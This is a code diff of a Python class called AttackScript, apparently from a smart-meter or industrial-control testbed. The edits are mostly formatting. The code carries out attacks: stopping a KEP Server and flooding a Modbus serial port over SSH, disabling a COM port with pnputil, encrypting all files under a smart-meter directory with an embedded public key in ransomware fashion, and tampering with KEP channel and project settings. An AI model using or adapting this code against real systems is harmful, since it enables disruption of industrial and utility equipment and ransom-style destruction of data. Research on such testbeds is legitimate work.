@@ -232,11 +232,8 @@ class AttackScript:
         Run modpoll to interrupt COM1 port by disabling KEP Server and then run modpoll indefenitely
         """
         self.kep_server_stop()
-
         baudrate = self.baudrate_check()
-
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
-
         parameters = ["-1", "-b", baudrate, '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
 
         check_modpoll = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
@@ -256,9 +253,7 @@ class AttackScript:
         Disable a COM port
         # TODO: Add Exception handling
         """
-
         self.kep_server_stop()
-
         checkCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /enum-devices /class Ports')
         dump = checkCOM.split()
         deviceID = ""
@@ -268,7 +263,6 @@ class AttackScript:
                 if "CVBCx196117" in deviceID:
                     comPort = deviceID
                     print(comPort)
-
         disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe /disable-device "{comPort}"')
         if "successfully" in disableCOM:
             print(disableCOM)
@@ -281,19 +275,16 @@ class AttackScript:
         # public key
         pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
         pubKey = base64.b64decode(pubKey)
-
         # exclude extensions
         excludeExtension = ['.py', '.pem', '.exe']
         try:
             for item in self.recurseFiles(self.SMARTMETER_PATH):
                 filePath = Path(item)
                 fileType = filePath.suffix.lower()
-
                 if fileType in excludeExtension:
                     continue
                 self.encrypt(filePath, pubKey)
                 print("Encrypted: " + str(filePath))
-
             print("Encryption Successful.\nOk.\n")
         except Exception as e:
             print("Encryption Failed.\nFail.\n")
@@ -1054,7 +1045,7 @@ class AttackScript:
         print(json.dumps(
             connectivity.channel.modify_channel(server, {"common.ALLTYPES_DESCRIPTION": "You only live once"}),
             indent=4))
-        print(connectivity.channel.get_channel(server,"Derrick's Channel"))
+        print(connectivity.channel.get_channel(server, "Derrick's Channel"))
 
     def kep_delete_channel(self, channel):
         server = self.kep_connect()
@@ -1194,9 +1185,10 @@ class AttackScript:
 
     def kep_modify_udd_profile(self, profile_name):
         server = self.kep_connect()
-        print(json.dumps(connectivity.udd.profile.modify_profile(server,{"common.ALLTYPES_NAME": "ModbusProfile",
-                                                                       "common.ALLTYPES_DESCRIPTION": "a short description"}), indent=4))
-        print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name),indent=4))
+        print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": "ModbusProfile",
+                                                                          "common.ALLTYPES_DESCRIPTION": "a short description"}),
+                         indent=4))
+        print(json.dumps(connectivity.udd.profile.get_profile(server, profile_name), indent=4))
 
     def kep_add_log_item(self, log_group="Derrick"):
         server = self.kep_connect()
@@ -1235,7 +1227,8 @@ class AttackScript:
 
     def kep_modify_project_properties(self):
         server = self.kep_connect()
-        print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": "Derrick"}), indent=4))
+        print(json.dumps(connection.server.modify_project_properties(server, {"common.ALLTYPES_NAME": "Derrick"}),
+                         indent=4))
         print(json.dumps(connection.server.get_project_properties(server), indent=4))
 
     def disable_running_schedules(self) -> None:
